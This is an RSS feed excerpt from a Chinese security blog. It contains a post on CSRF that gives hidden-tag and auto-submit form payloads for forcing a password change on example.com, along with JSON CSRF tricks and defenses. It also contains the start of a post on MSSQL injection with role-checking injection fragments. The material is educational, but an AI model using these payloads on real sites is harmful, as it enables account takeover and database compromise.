&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;企业管理组(Enterprise Admins)，是通用组范畴，只存在于根域，每个子域将该组加入本域的Administrators组，因而具备在当前子域的完全控制权限。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>CSRF 相关</title>
        <link>https://coollllllll.github.io/p/csrf/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/csrf/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/csrf/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post CSRF 相关" /&gt;&lt;h1 id=&#34;csrf相关&#34;&gt;CSRF相关&lt;/h1&gt;
&lt;h2 id=&#34;简述&#34;&gt;简述&lt;/h2&gt;
&lt;p&gt;跨站请求伪造(CSRF)，本质是诱使用户在已经认证成功的Web应用中执行非本意的敏感操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;与XSS的异同：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XSS本质是html代码中的注入，利用的是Web应用对站内用户的信任；而CSRF则是通过伪装成特定网站的受信任用户去执行敏感操作。&lt;/p&gt;
&lt;p&gt;XSS可获取用户Cookie等身份信息，而CSRF仅仅是模仿伪装，并没有获取用户身份信息。&lt;/p&gt;
&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;前提&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Cookie值是从本地存储中取出并填充进数据包&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户必须在同一个浏览器中点开链接&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目标后台身份验证机制不健全(仅有Cookie机制，缺少其他验证)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当某个用户访问目标网站并认证成功获得Cookie后，攻击者通过伪造用户身份(利用已经获得的Cookie)向目标网站发起敏感请求，而目标网站认为此Cookie有效，误认为此请求是真实用户发起，便响应请求。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 194; 
			flex-basis: 467px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/csrf/image-20220204162539367.png&#34; data-size=&#34;713x366&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/csrf/image-20220204162539367.png&#34;
			width=&#34;713&#34;
			height=&#34;366&#34;
			srcset=&#34;https://coollllllll.github.io/p/csrf/image-20220204162539367_huc18f459f3d108d0794317e58f7569d97_155786_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/csrf/image-20220204162539367_huc18f459f3d108d0794317e58f7569d97_155786_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;利用方式&#34;&gt;利用方式&lt;/h2&gt;
&lt;h3 id=&#34;get&#34;&gt;GET&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 假设一个简单的修改密码的场景
http://example.com/haha?password1=123456&amp;amp;password2=123456&amp;amp;op=change
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;直接构造URL，诱使用户更改密码&lt;/li&gt;
&lt;li&gt;短链接&lt;/li&gt;
&lt;li&gt;使用html标签实现无感触发&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;# 可配合XSS
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://example.com/haha?password1=123&amp;amp;password2=123&amp;amp;op=change&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
 
# style=&amp;#34;display:none;&amp;#34;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://example.com/haha?password1=123&amp;amp;password2=123&amp;amp;op=change&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;display:none;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
 
# border=&amp;#34;0&amp;#34; style=&amp;#34;display:none;&amp;#34;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://example.com/haha?password1=123&amp;amp;password2=123&amp;amp;op=change&amp;#34;&lt;/span&gt;
&lt;span class=&#34;na&#34;&gt;border&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;display:none;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;post&#34;&gt;POST&lt;/h3&gt;
&lt;p&gt;POST方式下攻击者可提供一个存在HTML表单自动提交的页面。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;form action=&amp;quot;http://example.com/haha?&amp;quot; id=&amp;quot;csrf&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;password1&amp;quot; value=&amp;quot;123&amp;quot;&amp;gt;
        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;password2&amp;quot; value=&amp;quot;123&amp;quot;&amp;gt;
        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;op&amp;quot; value=&amp;quot;change&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;json&#34;&gt;JSON&lt;/h3&gt;
&lt;p&gt;JSON CSRF 与普通 CSRF 的区别在于 ：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JSON 数据无法像 post 那样通过一般HTML表单进行构造&lt;/li&gt;
&lt;li&gt;且Content-Type 一般要求为 application/json，也无法通过表单构造&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;虽然 XMLHttpRequest、fetch 能构造出 JSON 请求，并且可以设置 Content-Type，但是无法跨域。&lt;/p&gt;
&lt;h4 id=&#34;未验证或未严格验证-content-type-头-和-json-格式&#34;&gt;未验证或未严格验证 Content-Type 头 和 JSON 格式&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;利用 JSON 格式容错性，例如加入&lt;code&gt;=&lt;/code&gt;号仍然可以被解析&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{&amp;quot;name&amp;quot;: &amp;quot;haha&amp;quot;, &amp;quot;age&amp;quot;: 18}=
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;伪造 JSON 格式&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;input name=&#39;{&amp;quot;name&amp;quot;:&amp;quot;haha&amp;quot;,&amp;quot;age&amp;quot;: 18, &amp;quot;test&amp;quot;:&amp;quot;&#39; value=&#39;test&amp;quot;}&#39; type=&#39;hidden&#39;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;严格验证-content-type-头-和-json-格式&#34;&gt;严格验证 Content-Type 头 和 JSON 格式&lt;/h4&gt;
&lt;p&gt;一般情况下需要 Flash + 307 重定向(但实际情况下 Flash 一般都会被禁用)。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Flash 文件&lt;/li&gt;
&lt;li&gt;跨域 XML 文件(如果 flash 文件和 PHP 同域，则不需要)&lt;/li&gt;
&lt;li&gt;具有 307 状态码的PHP文件(307跟其他 3XX HTTP 状态码之间的区别就在于，HTTP 307 可以确保重定向请求发送之后，请求方法和请求主体不会发生任何改变)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 123; 
			flex-basis: 296px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/csrf/image-20220302160434266.png&#34; data-size=&#34;626x506&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/csrf/image-20220302160434266.png&#34;
			width=&#34;626&#34;
			height=&#34;506&#34;
			srcset=&#34;https://coollllllll.github.io/p/csrf/image-20220302160434266_huae3ac1007bf78593eba36ae006394fd6_128721_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/csrf/image-20220302160434266_huae3ac1007bf78593eba36ae006394fd6_128721_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/blacksunny/p/7940287.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;JSON CSRF 1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/articles/web/164234.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;JSON CSRF 2&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;防御方式&#34;&gt;防御方式&lt;/h2&gt;
&lt;h3 id=&#34;referer头&#34;&gt;Referer头&lt;/h3&gt;
&lt;p&gt;限制Referer头必须为本站相关。当然该值可随意修改，因此不可信。&lt;/p&gt;
&lt;h3 id=&#34;token&#34;&gt;Token&lt;/h3&gt;
&lt;p&gt;CSRF 成功的原因就在于站点对于用户身份的辨别完全依赖于 Cookie，因此攻击者可以直接使用用户的 Cookie 来完成认证以执行敏感操作。&lt;/p&gt;
&lt;p&gt;所以可在请求中加入一个随机产生的由服务端维护的Token，服务器接收到用户请求后会验证 Token，如果无 Token 或者 Token 不正确的请求都会直接丢弃。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;既然是向页面内的请求中加入Token，就需要辨别内外链，如果是外链也加入Token，当攻击者诱使用户访问攻击者在目标站内所设的外链，则会泄露Token。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;samesite&#34;&gt;SameSite&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;同站判断规则：&lt;/p&gt;
&lt;p&gt;根据 Mozilla 维护的公共后缀表(Pulic Suffix List)中的有效顶级域名(eTLD)+1的规则查找得到的一级域名是否相同来判断是否是同站请求。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Cookie的SameSite属性用来限制第三方Cookie。&lt;/p&gt;
&lt;p&gt;有三个值：Strict、Lax、None&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Strict&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最为严格，完全禁止第三方Cookie。当跨站点时，任何情况下都不会带有Cookie。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Lax&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相对放宽，但大多数情况也是不发送第三方Cookie。&lt;/p&gt;
&lt;p&gt;其允许导航到目标网址的GET请求:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;请求类型&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;示例&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;正常情况&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Lax&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;链接&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;...&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;发送&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;发送&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;预加载&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;prerender&amp;quot; href=&amp;quot;...&amp;quot;/&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;发送&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;发送&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;GET 表单&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;&amp;lt;form method=&amp;quot;GET&amp;quot; action=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;发送&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;发送&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;POST 表单&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;&amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;发送&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;不发送&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;iframe&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;...&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;发送&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;不发送&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;AJAX&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;$.get(&amp;quot;...&amp;quot;)&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;发送&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;不发送&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Image&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;发送&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;不发送&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;None&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;None是无限制。&lt;/p&gt;
&lt;p&gt;Chrome升级到85版本后SameSite默认值由None变为Lax。用户可以修改其为None，但必须设置Secure属性(Cookie只能通过 HTTPS 协议发送)，否则无效。&lt;/p&gt;
&lt;h3 id=&#34;多次验证&#34;&gt;多次验证&lt;/h3&gt;
&lt;p&gt;对敏感请求加入验证码等验证机制，这样防御效果好，但会降低体验。&lt;/p&gt;
&lt;h3 id=&#34;对于json格式csrf的防御&#34;&gt;对于json格式CSRF的防御&lt;/h3&gt;
&lt;p&gt;严格校验 Content-Type 和 数据体格式&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MSSQL 注入与提权相关</title>
        <link>https://coollllllll.github.io/p/mssql/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/mssql/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/mssql/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post MSSQL 注入与提权相关" /&gt;&lt;h1 id=&#34;mssql注入与提权相关&#34;&gt;MSSQL注入与提权相关&lt;/h1&gt;
&lt;h2 id=&#34;sql-server简介&#34;&gt;SQL Server简介&lt;/h2&gt;
&lt;h3 id=&#34;系统数据库&#34;&gt;系统数据库&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 144; 
			flex-basis: 347px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220217170606658.png&#34; data-size=&#34;168x116&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220217170606658.png&#34;
			width=&#34;168&#34;
			height=&#34;116&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220217170606658_hu19848205de2b9d0c52ec1b04b45775d4_3655_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220217170606658_hu19848205de2b9d0c52ec1b04b45775d4_3655_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;master：用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;model：SQL Server 为用户数据库提供的样板，新的用户数据库都以 model 数据库为基础&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msdb：由 Enterprise Manager 和 Agent 使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;tempdb：它为临时表和其他临时工作提供了一个存储区。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;master数据库存储了所有数据库名和存储过程，类似MySQL中的&lt;code&gt;information_schema&lt;/code&gt; 元数据库。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 70; 
			flex-basis: 168px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220217171743009.png&#34; data-size=&#34;298x425&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220217171743009.png&#34;
			width=&#34;298&#34;
			height=&#34;425&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220217171743009_hu9bcb8cb4075ab006942e5046680901ad_15908_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220217171743009_hu9bcb8cb4075ab006942e5046680901ad_15908_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;视图表&lt;code&gt;master.dbo.sysdatabases&lt;/code&gt;存储所有数据库名，其他数据库则存储本库的表名和列名；每一个库的视图表&lt;code&gt;syscolumns&lt;/code&gt;存储所有的字段；可编程性存储函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询所有数据库名：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select name from master.dbo.sysdatabases;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 121; 
			flex-basis: 290px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220217171832158.png&#34; data-size=&#34;144x119&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220217171832158.png&#34;
			width=&#34;144&#34;
			height=&#34;119&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220217171832158_hu92cfdaa8fe6337f53e9d7fffbbc3c54c_2623_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220217171832158_hu92cfdaa8fe6337f53e9d7fffbbc3c54c_2623_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;sysobjects表字段&#34;&gt;sysobjects表字段&lt;/h3&gt;
&lt;p&gt;在数据库中创建的每个对象（例如约束、默认值、日志、规则以及存储过程）都对应一行。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select name,xtype from sysobjects;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询返回结果中，&lt;code&gt;xtype&lt;/code&gt;可以是如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;C = CHECK 约束&lt;/li&gt;
&lt;li&gt;D = 默认值或 DEFAULT 约束&lt;/li&gt;
&lt;li&gt;F = FOREIGN KEY 约束&lt;/li&gt;
&lt;li&gt;L = 日志&lt;/li&gt;
&lt;li&gt;FN = 标量函数&lt;/li&gt;
&lt;li&gt;IF = 内嵌表函数&lt;/li&gt;
&lt;li&gt;P = 存储过程&lt;/li&gt;
&lt;li&gt;PK = PRIMARY KEY 约束（类型是 K）&lt;/li&gt;
&lt;li&gt;RF = 复制筛选存储过程&lt;/li&gt;
&lt;li&gt;S = 系统表&lt;/li&gt;
&lt;li&gt;TF = 表函数&lt;/li&gt;
&lt;li&gt;TR = 触发器&lt;/li&gt;
&lt;li&gt;U = 用户表&lt;/li&gt;
&lt;li&gt;UQ = UNIQUE 约束（类型是 K）&lt;/li&gt;
&lt;li&gt;V = 视图&lt;/li&gt;
&lt;li&gt;X = 扩展存储过程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 135; 
			flex-basis: 324px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220217172311966.png&#34; data-size=&#34;203x150&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220217172311966.png&#34;
			width=&#34;203&#34;
			height=&#34;150&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220217172311966_hu57f2ae1f5213b16bb4f35681308dba30_3054_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220217172311966_hu57f2ae1f5213b16bb4f35681308dba30_3054_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;sql-server-信息收集&#34;&gt;SQL Server 信息收集&lt;/h2&gt;
&lt;h3 id=&#34;权限判断&#34;&gt;权限判断&lt;/h3&gt;
&lt;p&gt;SQL Server有三大主体：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows 级别主体&lt;/li&gt;
&lt;li&gt;服务器级别主体&lt;/li&gt;
&lt;li&gt;数据库级别主体&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 202; 
			flex-basis: 484px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220217173609163.png&#34; data-size=&#34;584x289&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220217173609163.png&#34;
			width=&#34;584&#34;
			height=&#34;289&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220217173609163_hubb5ac6d377cd8816c6447a5b5c9cc4b6_54436_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220217173609163_hubb5ac6d377cd8816c6447a5b5c9cc4b6_54436_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;服务器级别角色&#34;&gt;服务器级别角色&lt;/h4&gt;
&lt;p&gt;SQL Server 提供服务器级角色以帮助你管理服务器上的权限。 这些角色是可组合其他主体的安全主体。 服务器级角色的权限作用域为服务器范围。 （“角色”类似于 Windows 操作系统中的“组”。）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 114; 
			flex-basis: 275px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220217173800119.png&#34; data-size=&#34;857x746&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220217173800119.png&#34;
			width=&#34;857&#34;
			height=&#34;746&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220217173800119_hu5ae8a1a27425497e517cc8f02b7b92a1_100089_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220217173800119_hu5ae8a1a27425497e517cc8f02b7b92a1_100089_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可使用&lt;code&gt;IS_SRVROLEMEMBER ( &#39;role&#39; [ , &#39;login&#39; ] )&lt;/code&gt; 来判断登录名是否为指定服务器角色的成员，该函数有如下返回值：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;返回值&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;login 不是 role 的成员。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;login 是 role 的成员。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NULL&lt;/td&gt;
&lt;td&gt;role 或 login 无效，或者没有查看角色成员身份的权限。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;因此可通过如下语句判断登录名的服务器角色：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;and 1=(select is_srvrolemember(&#39;sysadmin&#39;))
and 1=(select is_srvrolemember(&#39;serveradmin&#39;))
and 1=(select is_srvrolemember(&#39;setupadmin&#39;))
and 1=(select is_srvrolemember(&#39;securityadmin&#39;))
and 1=(select is_srvrolemember(&#39;diskadmin&#39;))
and 1=(select is_srvrolemember(&#39;bulkadmin&#39;))
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;使用sqlmap的&lt;code&gt;-is-dba&lt;/code&gt;可判断是否为管理员权限。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;数据库级别角色&#34;&gt;数据库级别角色&lt;/h4&gt;
&lt;p&gt;数据库级角色的权限作用域为数据库范围。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 155; 
			flex-basis: 373px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220217175907982.png&#34; data-size=&#34;879x565&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220217175907982.png&#34;
			width=&#34;879&#34;
			height=&#34;565&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220217175907982_hu641505fdcd6bbe60067b6cc285d41374_73042_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220217175907982_hu641505fdcd6bbe60067b6cc285d41374_73042_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
